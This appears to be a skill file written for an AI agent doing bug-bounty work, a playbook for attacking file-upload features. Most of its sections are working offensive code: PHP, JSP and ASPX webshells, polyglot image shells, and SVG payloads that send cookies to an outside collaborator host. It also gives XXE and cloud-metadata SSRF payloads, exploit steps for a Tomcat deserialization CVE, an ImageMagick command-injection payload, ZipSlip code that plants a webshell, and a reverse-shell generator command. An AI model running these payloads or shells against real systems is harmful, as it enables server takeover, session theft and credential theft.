---
name: hunt-file-upload
description: "Modern File Upload hunting (2025-2026). Use when target has /upload, /avatar, /profile, /attachment, /import, /document, drag-and-drop, presigned-URL flows, or CMS/import features. Covers 14 extension bypasses, MIME/magic-byte spoofing, polyglot files, SVG XSS chains, DOCX/XLSX/SVG XXE, ZipSlip, CVE-2025-24813 (Apache Tomcat partial PUT RCE), CVE-2025-55752 (Tomcat URL rewrite bypass), .htaccess/web.config upload, presigned-URL abuse, image processor RCE (ImageTragick, ghostscript). Cross-reference hunt-rce §4 for full webshell list. PoC: id output from webshell, or admin context exec from SVG. Skip if upload is presigned-only with strict content-type pin and CDN-segregated origin."
---

# File Upload Hunt — 2025-2026 Powerful Edition

File upload is one of the highest-payout surfaces. RCE via webshell pays $2k–$25k. SVG XSS in admin context pays $1k–$15k. Modern 2025 CVEs (Tomcat PUT, URL-rewrite) make this still a live class.

> **PoC bar:** `id`/`whoami` output from your uploaded shell, OR cookie/token exfil from admin viewing your SVG, OR cross-tenant file read via path traversal in filename.

---

## 0. 60-Second Recon

```bash
# Find every upload endpoint
gau target.com | grep -iE 'upload|attach|avatar|profile|import|document|file|picture|photo|media' > upload-endpoints.txt
katana -u https://target.com -fr | grep -iE 'multipart/form-data|enctype'

# Mobile API often has different upload endpoints
# Look in JS bundles for: FormData, .upload, S3 presigned, multipart

# Cloud upload signatures
curl -ks https://target.com | grep -iE 's3.amazonaws.com|storage.googleapis|blob.core.windows|cloudinary|imgix|filestack'
```

**Fingerprint:**
- Direct upload to app vs presigned-URL to cloud
- Same-origin serving vs CDN origin
- Type validation: client-only (trivial), MIME-header, magic-byte, extension allowlist, deep content scan
- Avatar resizing/conversion (often strips dangerous SVG → check both processed and original)
- Backend: Apache Tomcat (CVE-2025 PUT class), IIS (web.config tricks), Nginx (off-by-slash), Express (path traversal in filename)

---

## 1. The Attack Matrix

| # | Attack | Detection | Effort | Bounty |
|---|--------|-----------|--------|--------|
| 1 | Webshell direct upload | extension/content check absent | 5 min | $3k–$25k |
| 2 | Extension bypass (double, case, alt) | extension allowlist exists | 15 min | $2k–$20k |
| 3 | MIME spoofing | Content-Type header validated only | 5 min | $1k–$5k |
| 4 | Magic byte prepend | content check is shallow | 10 min | $1k–$8k |
| 5 | Polyglot file (PNG+PHP, GIF+JS) | strict typing | 15 min | $2k–$10k |
| 6 | .htaccess upload | Apache, accepts arbitrary | 5 min | $2k–$10k |
| 7 | web.config upload (IIS) | IIS, no extension filter on `.config` | 5 min | $2k–$8k |
| 8 | SVG with `<script>` | served as image/svg+xml | 5 min | $1k–$8k |
| 9 | DOCX/XLSX XXE | DOCX uploaded → processed server-side | 10 min | $2k–$10k |
| 10 | SVG with foreignObject | image-only check | 10 min | $1k–$5k |
| 11 | ZipSlip | archive upload + extract | 15 min | $2k–$15k |
| 12 | Filename path traversal | filename used as path | 5 min | $1k–$10k |
| 13 | Tomcat CVE-2025-24813 (PUT) | Tomcat 9/10/11 + PUT enabled | 2 min | $5k–$30k |
| 14 | Tomcat CVE-2025-55752 (rewrite) | URL rewrite + upload + .jsp | 5 min | $5k–$25k |
| 15 | Image processor RCE (CVE-2016-3714 ImageMagick) | ImageMagick processes upload | 10 min | $5k–$25k |
| 16 | Ghostscript RCE | PDF/EPS processing | 10 min | $5k–$25k |
| 17 | Presigned URL takeover | S3 presigned with PUT, no path constraint | 10 min | $1k–$10k |
| 18 | Antivirus / scanner bypass | EICAR not detected, then real payload | 10 min | $500–$3k |

---

## 2. Extension Bypass Matrix (try ALL in this order)

| # | Technique | Example |
|---|-----------|---------|
| 1 | Direct | `shell.php` |
| 2 | Case variation | `shell.pHp`, `shell.PHP5`, `shell.PhTML` |
| 3 | Alternate exec extensions | `.phtml` `.phar` `.pht` `.php5` `.php7` `.phps` `.inc` |
| 3b | JSP variants | `.jsp` `.jspx` `.jsw` `.jsv` `.jspf` `.wss` |
| 3c | ASPX variants | `.aspx` `.asp` `.cer` `.asa` `.ashx` `.asmx` |
| 4 | Double extension | `shell.php.jpg` (server checks last) `shell.jpg.php` (server checks first) |
| 5 | Null byte | `shell.php%00.jpg` `shell.php\x00.jpg` (older PHP/Java) |
| 6 | Trailing dot/space | `shell.php.` `shell.php ` `shell.php/` (Windows strips) |
| 7 | Path traversal in name | `../../../../var/www/html/shell.php` |
| 8 | .htaccess upload | `AddType application/x-httpd-php .jpg` |
| 9 | web.config upload (IIS) | `<handlers>... <add ... path="*.jpg" verb="*" ... /></handlers>` |
| 10 | RTL Unicode override | `shell.gpj‮php.` (U+202E) |
| 11 | Long filename truncation | `shell.php.<300 chars>.jpg` |
| 12 | Mixed separator (Windows) | `shell.php:.jpg` (NTFS Alternate Data Stream) |
| 13 | Case + alt | `shell.pHTML` |
| 14 | Apache MultiViews | `shell.php.xyz` (Apache picks .php) |

---

## 3. MIME & Magic Byte Bypasses

### 3.1 MIME spoof
Always set `Content-Type: image/jpeg` regardless of actual file type. Many backends trust this header.

### 3.2 Magic byte prepend
Prepend valid image magic bytes to a script:
```bash
# PNG header + PHP
echo -e '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > shell.png.php

# GIF header + PHP (cleanest — looks fully valid as GIF89a)
echo -e 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.gif.php

# JPEG header + PHP
echo -e '\xff\xd8\xff\xe0<?php system($_GET["c"]); ?>' > shell.jpg.php

# PDF header + JS
echo -e '%PDF-1.4\n<?php system($_GET["c"]); ?>' > shell.pdf.php
```

### 3.3 Polyglot files
**GIF89a/<?php is the gold standard:**
```
GIF89a;/*<?php system($_GET['c']); ?>*/
```
Valid GIF (browser displays) AND valid PHP (server executes).

---

## 4. SVG XSS Chains (chain with hunt-xss)

### 4.1 Inline `<script>`
```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//collab.oast.pro/?c='+document.cookie)">
  <script>alert(document.domain)</script>
</svg>
```

### 4.2 foreignObject for HTML
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>
```

### 4.3 SVG with XXE (chain with hunt-xxe)
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text font-size="20">&xxe;</text></svg>
```

### 4.4 SVG referencing internal host (SSRF chain)
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" />
</svg>
```

### 4.5 SVG with `<use href>` (Trusted Types bypass)
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <use href="https://attacker.com/evil.svg#x"/>
</svg>
```

### 4.6 Same-origin gate
SVG XSS only counts if served on a target's auth-origin. Check:
```bash
curl -ks https://target.com/uploads/<id> | head -3
# Content-Type: image/svg+xml? → executes
# Content-Disposition: attachment? → downloaded, not executed
# Hosted on cdn.target.com? → different origin, different rules
```

---

## 5. DOCX / XLSX / SVG XXE Upload

Office documents are ZIP archives containing XML. Modify `word/document.xml` or `xl/workbook.xml`:
```bash
# Unzip a normal .docx
unzip normal.docx -d doc/

# Inject XXE in word/document.xml header
sed -i 's|<?xml version="1.0".*?>|<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://collab/dtd">]>|' doc/word/document.xml

# Re-zip
cd doc && zip -r ../evil.docx . && cd ..
```
Upload to a backend that parses DOCX (resume parsers, invoice importers, document converters).

---

## 6. Apache Tomcat 2025 CVEs (Critical RCE)

### 6.1 CVE-2025-24813 — Partial PUT RCE
**Affected:** Tomcat 9.0.0-M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**Detection:** Tomcat fingerprint + PUT method allowed
```bash
curl -ks -X OPTIONS https://target.com/ -I | grep -i allow
# Allow: GET, HEAD, POST, PUT, ...   ← PUT means try this
```

**Exploit:**
```bash
# Step 1: Upload serialized Java session via partial PUT
curl -k -X PUT "https://target.com/path/to/anything" \
  -H "Content-Range: bytes 0-100/200" \
  --data-binary @session.ser

# Step 2: Trigger deserialization via crafted JSESSIONID
curl -k "https://target.com/" -b "JSESSIONID=.<the-uploaded-session-name>"
```

CVSS 9.8. Generate `session.ser` with `ysoserial CommonsCollections1 "curl http://collab/$(id|base64)"`.

### 6.2 CVE-2025-55752 — URL rewrite bypass
**Detection:** Tomcat using RewriteValve + file upload that writes to webroot.

**Exploit:**
- Find a URI that, after URL normalization but before path decoding, places attacker-controlled file under `/WEB-INF/` or webroot.
- Upload `.jsp` to that path, request it directly → RCE.

---

## 7. ImageMagick / Ghostscript RCE (file processor chain)

### 7.1 CVE-2016-3714 ImageTragick (still finds bugs)
Save as `exploit.mvg` or `exploit.jpg`, upload:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|curl http://collab/$(id|base64)")'
pop graphic-context
```
If ImageMagick processes via shell (with delegate config), command executes.

### 7.2 Ghostscript (CVE-2018-16509, CVE-2019-25032, CVE-2024-34459 etc.)
Crafted PDF/EPS triggers RCE in Ghostscript. Upload to PDF preview/thumbnail features.

### 7.3 Newer ImageMagick CVEs
- CVE-2024-41817 — AppImage PATH-based RCE
- CVE-2025-57807 — heap OOB

Check `identify -version` if you can reach the binary. Or test with known PoCs.

---

## 8. ZipSlip (archive extraction path traversal)

Upload zip whose entries contain `../../../`:
```python
import zipfile
with zipfile.ZipFile('zipslip.zip','w') as z:
    z.writestr('../../../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
    # Or for Tomcat:
    z.writestr('../../../../usr/local/tomcat/webapps/ROOT/shell.jsp', '<jsp shell>')
```
Upload to any feature that auto-extracts (theme upload, plugin upload, import-from-zip, document bundle).

---

## 9. Presigned URL Abuse

Many apps use S3 presigned URLs for upload. Bugs:
- Presigned URL doesn't pin Content-Type → upload anything (HTML, JS)
- Presigned URL doesn't pin filename → write outside intended prefix
- Presigned URL for one user → reusable for another → cross-tenant write
- Presigned URL exposed in API response to read-only user → write access

```bash
# Extract presigned URL from /api/upload-url response
# Send PUT with malicious content
curl -k -X PUT "https://bucket.s3.amazonaws.com/PRESIGNED_URL" \
  -H "Content-Type: text/html" \
  --data-binary '<script>alert(1)</script>'

# Then access via the canonical URL — XSS lands on the bucket origin
```

---

## 10. Webshells Library

### PHP (minimal)
```php
<?php system($_GET['c']); ?>
<?=`$_GET[0]`?>
<?php @eval($_SERVER['HTTP_X_C']); ?>   // header-driven
```

### JSP (full shell)
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%String c=request.getParameter("c");if(c!=null){Process p=Runtime.getRuntime().exec(c);BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null)out.println(l);}%>
```

### ASPX (C#)
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">void Page_Load(object s,EventArgs e){var p=Process.Start(new ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false});Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");}</script>
```

### .htaccess (Apache override)
```apache
AddType application/x-httpd-php .jpg .png .gif .txt
SetHandler application/x-httpd-php
```

### web.config (IIS)
```xml
<?xml version="1.0"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
  </system.webServer>
</configuration>
<% Response.write("-"&"hello world"&"-") %>
```

---

## 11. Confirmation

After upload, the file URL must:
1. Serve with executable Content-Type (text/html, image/svg+xml for XSS; or .php/.jsp executed)
2. Be on a SAME-ORIGIN as authenticated session (for XSS, cookie theft)
3. Return EXECUTION OUTPUT (not just upload-success)

```bash
# Probe
curl -ks "https://target.com/uploads/shell.phtml?c=id"
# Expect: "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
```

If output → RCE confirmed → Critical $5k–$25k.

---

## 12. Chain to Critical

```
PHP webshell upload + same-origin = RCE
SVG XSS + admin views = admin session theft
DOCX XXE + resume parser = file read (chain to hunt-xxe)
ZipSlip + theme upload (WordPress/Drupal) = RCE
Filename path traversal + write-anywhere = overwrite .htaccess = RCE
Presigned URL HTML upload + same-origin = XSS / phishing
Tomcat CVE-2025-24813 = pre-auth RCE
ImageMagick CVE-2016-3714 + avatar upload = RCE
```

---

## 13. Validation Gate

Before reporting:
1. Got actual code execution? (`id` output, not just upload success)
2. Same-origin? (Bucket on cdn.target.com may not chain to ATO)
3. Test account can't be admin (auto-permissioned)? Use plain user account.
4. Not blocked at WAF/AV with default payload? Document the bypass.
5. Cross-tenant impact possible? (Other-user file read/overwrite is higher severity.)

---

## 14. Tools

```bash
# Upload bypass scanner
upload-burp-scanner       # Burp ext
fuxploider               # python upload exploit
weevely <url> <password>  # PHP webshell generator
msfvenom -p php/meterpreter/reverse_tcp -f raw    # Metasploit PHP
ysoserial-all.jar         # generate Tomcat session payload for CVE-2025-24813

# Nuclei
nuclei -t http/cves/2025/CVE-2025-24813.yaml -l live.txt
nuclei -t http/cves/2025/CVE-2025-55752.yaml -l live.txt
```

---

## 15. Mantras

- Try webshell direct first. If allowed, you're done.
- 14 extension bypasses. Try them ALL — automation is your friend.
- Magic byte + alt extension = the most reliable bypass for "secure" filters.
- SVG + same-origin = XSS. SVG + cross-origin = nothing.
- Tomcat? Always test CVE-2025-24813 — 2-minute Critical.
- The processor (ImageMagick, Ghostscript) is more vulnerable than the upload itself. Probe.
- Presigned URLs without content-type pinning = persistent XSS goldmine.
